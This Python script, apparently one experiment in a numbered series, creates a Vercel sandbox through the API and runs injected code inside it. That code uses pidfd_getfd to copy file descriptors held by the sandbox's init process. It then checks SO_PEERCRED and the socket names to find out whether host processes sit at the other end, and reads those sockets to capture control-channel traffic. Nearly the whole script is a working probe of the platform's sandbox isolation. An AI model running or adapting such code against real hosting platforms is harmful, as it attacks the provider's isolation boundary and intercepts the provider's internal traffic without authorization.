# -*- coding: utf-8 -*-
"""实验J284: 复制 init fd 4/7/8 + SO_PEERCRED 对端身份识别
判断 accepted 连接 (fd 7/8) 对端是沙箱内进程还是宿主进程:
1) pidfd_getfd 复制 fd   2) SO_PEERCRED (pid/uid/gid)
3) getsockname/getpeername   4) 非阻塞 recv 观察有无流量
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": True, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} wall={time.time()-t0:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
        except Exception:
            print(line[:400], flush=True)
    return out

NAME = "expj284"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
if c != 200:
    print("create fail", r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, socket, struct, time, ctypes

libc = ctypes.CDLL(None, use_errno=True)
SYS_pidfd_open = 434
SYS_pidfd_getfd = 438

def pidfd_open(pid, flags=0):
    r = libc.syscall(SYS_pidfd_open, pid, flags)
    if r < 0:
        e = ctypes.get_errno()
        raise OSError(e, os.strerror(e))
    return r

def pidfd_getfd(pidfd, fd, flags=0):
    r = libc.syscall(SYS_pidfd_getfd, pidfd, fd, flags)
    if r < 0:
        e = ctypes.get_errno()
        raise OSError(e, os.strerror(e))
    return r

pidfd = pidfd_open(1, 0)
print("pidfd:", pidfd, flush=True)

def copy_fd(i):
    try:
        return pidfd_getfd(pidfd, i, 0)
    except Exception as e:
        print("copy fd %d ERR %s: %s" % (i, type(e).__name__, e), flush=True)
        return None

print("===== init fd 全表 =====", flush=True)
for i in range(0, 20):
    try:
        print(i, "->", os.readlink("/proc/1/fd/%d" % i), flush=True)
    except Exception:
        pass

copied = {}
for i in (4, 7, 8):
    nfd = copy_fd(i)
    if nfd is not None:
        copied[i] = nfd
        print("copied init fd %d -> our fd %d" % (i, nfd), flush=True)

print("===== SO_PEERCRED (pid/uid/gid) =====", flush=True)
SOL_SOCKET = 1
SO_PEERCRED = 17
def peercred(fd):
    cred = (ctypes.c_int * 3)()
    ln = ctypes.c_int(12)
    r = libc.getsockopt(fd, SOL_SOCKET, SO_PEERCRED, cred, ctypes.byref(ln))
    if r < 0:
        e = ctypes.get_errno()
        return "ERR %d %s" % (e, os.strerror(e))
    return "pid=%d uid=%d gid=%d" % (cred[0], cred[1], cred[2])
for i, nfd in copied.items():
    print("init fd %d (ours %d): PEER %s" % (i, nfd, peercred(nfd)), flush=True)

print("===== getsockname / getpeername =====", flush=True)
class sockaddr_un(ctypes.Structure):
    _fields_ = [("sun_family", ctypes.c_ushort), ("sun_path", ctypes.c_char * 108)]
def sockname(fd, fn):
    addr = sockaddr_un()
    ln = ctypes.c_int(ctypes.sizeof(addr))
    r = getattr(libc, fn)(fd, ctypes.byref(addr), ctypes.byref(ln))
    if r < 0:
        e = ctypes.get_errno()
        return "ERR %d %s" % (e, os.strerror(e))
    return "fam=%d path=%r" % (addr.sun_family, addr.sun_path[:ln.value - 2])
for i, nfd in copied.items():
    print("init fd %d: name=%s peer=%s" % (i, sockname(nfd, "getsockname"), sockname(nfd, "getpeername")), flush=True)

print("===== 非阻塞观察 fd 7/8 流量 (8s) =====", flush=True)
for i, nfd in copied.items():
    if i in (4,):
        continue  # listen fd 不读
    try:
        os.set_blocking(nfd, False)
    except Exception:
        pass
# 先 sleep 1s 让自身输出完全刷完再开始观察
time.sleep(1)
t_end = time.time() + 8
while time.time() < t_end:
    for i, nfd in list(copied.items()):
        if i == 4:
            continue
        try:
            d = os.read(nfd, 4096)
            if d:
                print("RECV on init fd %d (%dB): %r" % (i, len(d), d[:200]), flush=True)
        except BlockingIOError:
            pass
        except Exception as e:
            print("init fd %d read ERR %s: %s" % (i, type(e).__name__, e), flush=True)
    time.sleep(0.2)
print("OBSERVE_DONE", flush=True)

os.close(pidfd)
'''
out = run_cmd(sid, CODE, "PEERCRED", timeout=100)
print(out[:6000], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
